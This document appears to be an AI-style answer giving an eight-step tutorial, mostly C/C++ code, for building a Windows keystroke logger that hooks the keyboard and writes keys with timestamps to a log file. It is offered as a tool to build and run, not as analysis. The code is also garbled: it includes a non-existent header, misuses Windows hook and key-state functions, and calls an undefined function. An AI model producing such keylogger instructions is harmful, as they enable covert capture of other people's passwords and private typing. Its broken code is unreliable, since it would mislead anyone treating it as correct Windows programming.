To create a keystroke logger for Windows, follow these steps:

**Step 1: Include Necessary Headers**
Include the Windows header files required for keyboard hooks and file operations.
```c
#include <windows.h>
#include <keyboard.h>
#include <fstream>
#include <ctime>
#include <iostream>
```

**Step 2: Define Constants**
Define constants for key states and file operations.
```c
// Key states
#define KEY_DOWN             0x0001
#define KEY_UP               0x0002
#define KEY_FIRST             0x0800
#define KEY_LAST             0x0011
#define MOD_SHIFT           0x0001
#define MOD_CTRL            0x0004
#define MOD_ALT             0x0008

// File operations
#define LOG_FILE_NAME        "KeystrokeLog.txt"
#define MAX_BUFFER_SIZE      1024
```

**Step 3: Initialize Variables**
Declare variables for the hook handle, file, buffer, and timestamp.
```c
HHOOK hKeyboardHook = 0;
std::ofstream keystrokeLog;
char buffer[MAX_BUFFER_SIZE];
std::string timestamp;

// Initialize buffer with current time
std::time_t now;
time(&now);
timestamp = std::ctime(&now);
```

**Step 4: Set Up the Keyboard Hook**
Use `SetWindowsHook` to set up the keyboard hook and define a callback function.
```c
hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardCallback);

// Function prototype for the callback
LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);
```

**Step 5: Define the Callback Function**
The callback function handles key presses and updates the log.
```c
LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    static int lastKey = 0;
    static int lastTime = 0;

    if (wParam == 0x0001) {
        // Key down
        if (lastKey != wParam) {
            lastKey = wParam;
            // Check for modifiers
            unsigned int modifiers = GetKeyState(WM_KEYDOWN, wParam);
            if (modifiers & MOD_SHIFT) { // Shift is pressed
                timestamp += ", Shift";
            } else if (modifiers & MOD_CTRL) { // Ctrl is pressed
                timestamp += ", Ctrl";
            } else if (modifiers & MOD_ALT) { // Alt is pressed
                timestamp += ", Alt";
            }
            // Append to log
            keystrokeLog << timestamp << ", " << static_cast<char>(lastKey) << '\n';
            lastTime = std::time(nullptr);
        }
    } else if (wParam == 0x0002) {
        // Key up
        if (lastKey == wParam) {
            // Remove modifiers from timestamp
            size_t pos = timestamp.find_last_of(", ");
            if (pos != std::string::npos) {
                timestamp = timestamp.substr(0, pos);
            }
            lastKey = 0;
        }
    }
    return 0;
}
```

**Step 6: Run the Hook and Log**
Use a loop to monitor key states and write to the log file.
```c
std::thread thread(&MainLoop);
thread.detach();

while (true) {
    std::this_thread::sleep_for(std::chrono::milliseconds(1));
}
```

**Step 7: Write the Main Loop Function**
Define a function to handle the main loop and cleanup.
```c
void MainLoop() {
    while (hKeyboardHook) {
        if (IsWindowFocusEditted()) {
            // Handle window switching
            // (Add code to handle switching focus)
        }
        // Check for error in hook
        if (GetLastError() != 0) {
            // Handle errors
        }
    }
    UnhookWindowsHook(hKeyboardHook);
    // Close the log file
    if (keystrokeLog.is_open()) {
        keystrokeLog.close();
    }
}
```

**Step 8: Compile and Run**
Compile the code and ensure it runs with administrative privileges if necessary.

